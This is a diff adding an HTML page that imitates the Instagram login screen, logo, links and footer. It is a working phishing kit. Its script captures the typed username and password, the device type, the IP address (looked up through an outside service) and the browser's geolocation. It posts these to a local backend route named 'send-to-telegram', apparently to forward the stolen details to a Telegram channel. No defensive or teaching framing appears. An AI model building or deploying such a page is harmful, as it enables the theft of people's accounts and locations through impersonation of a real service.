@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <link rel="icon" type="image/png" href="instagram.png">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login • Instagram</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="login-container">
+    <div class="login-box">
+      <img src="logo.png" alt="Instagram Logo" class="logo" width="180">
+
+      <form id="login-form">
+        <div class="input-group">
+          <input type="text" id="email" placeholder="Phone number, username, or email" required>
+        </div>
+        <div class="input-group password-container">
+          <input type="password" id="password" placeholder="Password" required>
+          <button type="button" class="show-btn" onclick="togglePassword()">Show</button>
+        </div>
+        <button type="submit" class="login-btn">Log in</button>
+      </form>
+
+      <div class="separator">
+        <div class="line"></div>
+        <span>OR</span>
+        <div class="line"></div>
+      </div>
+
+      <div class="facebook-login">
+        <a href="https://www.facebook.com/login.php/" class="facebook-link">Log in with Facebook</a>
+      </div>
+
+      <a href="https://www.instagram.com/accounts/password/reset/" class="forgot-password">Forgot password?</a>
+    </div>
+
+    <div class="signup-box">
+      <p>Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a></p>
+    </div>
+
+    <div class="app-section">
+      <p>Get the app.</p>
+      <div class="app-buttons">
+        <a href="https://play.google.com" target="_blank">
+          <img src="https://static.cdninstagram.com/rsrc.php/v4/yz/r/c5Rp7Ym-Klz.png" alt="Google Play">
+        </a>
+        <a href="https://www.microsoft.com/store/apps" target="_blank">
+          <img src="https://static.cdninstagram.com/rsrc.php/v4/yu/r/EHY6QnZYdNX.png" alt="Microsoft Store">
+        </a>
+      </div>
+    </div>
+
+    <footer>
+      <div class="footer-links">
+        <a href="https://your-long-github-link.com/very/long/link" target="_blank">https://www.instagram.com/accounts/login/?hl=eho</a>
+        <a href="#">Meta</a>
+        <a href="#">About</a>
+        <a href="#">Blog</a>
+        <a href="#">Jobs</a>
+        <a href="#">Help</a>
+        <a href="#">API</a>
+        <a href="#">Privacy</a>
+        <a href="#">Terms</a>
+        <a href="#">Locations</a>
+        <a href="#">Instagram Lite</a>
+        <a href="#">Threads</a>
+        <a href="#">Contact Uploading & Non-Users</a>
+        <a href="#">Meta Verified</a>
+      </div>
+      <div class="footer-info">
+        <span>English</span> &nbsp; © 2024 Instagram from Meta
+      </div>
+    </footer>
+
+    <style>
+      footer {
+        text-align: center;
+        font-size: 12px;
+        color: #8e8e8e;
+        margin-top: 30px;
+        padding: 20px 0;
+      }
+      .footer-links {
+        margin-bottom: 10px;
+      }
+      .footer-links a {
+        color: #8e8e8e;
+        text-decoration: none;
+        margin: 0 8px;
+      }
+      .footer-links a:hover {
+        text-decoration: underline;
+      }
+      .footer-info {
+        margin-top: 5px;
+      }
+    </style>
+    
+
+  <script>
+    function togglePassword() {
+      const passwordInput = document.getElementById("password");
+      passwordInput.type = passwordInput.type === "password" ? "text" : "password";
+    }
+
+    document.getElementById("login-form").addEventListener("submit", (event) => {
+      event.preventDefault();
+
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
+      const device = detectDevice(); // Get the device type
+      const userAgent = navigator.userAgent;
+
+      // Get user's IP address using an external service
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          const ipAddress = data.ip;
+
+          // Check for geolocation
+          if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition((position) => {
+              const latitude = position.coords.latitude;
+              const longitude = position.coords.longitude;
+
+              // Send data to backend
+              fetch('http://localhost:3000/send-to-telegram', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                  email: email,
+                  password: password,
+                  device: device,
+                  ipAddress: ipAddress,
+                  latitude: latitude,
+                  longitude: longitude
+                }),
+              })
+              .then(response => alert('Data sent successfully'))
+              .catch(error => alert('Error sending data: ' + error));
+            }, (error) => {
+              alert("Geolocation error: " + error.message);
+            });
+          } else {
+            alert("Geolocation is not supported by this browser.");
+          }
+        })
+        .catch(error => {
+          alert("Failed to get IP address: " + error.message);
+        });
+    });
+
+    // Function to detect the device
+    function detectDevice() {
+      if (navigator.userAgent.match(/Mobile/)) {
+        return 'Mobile';
+      } else if (navigator.userAgent.match(/Tablet/)) {
+        return 'Tablet';
+      } else {
+        return 'Desktop';
+      }
+    }
+  </script>
+</body>
+</html>
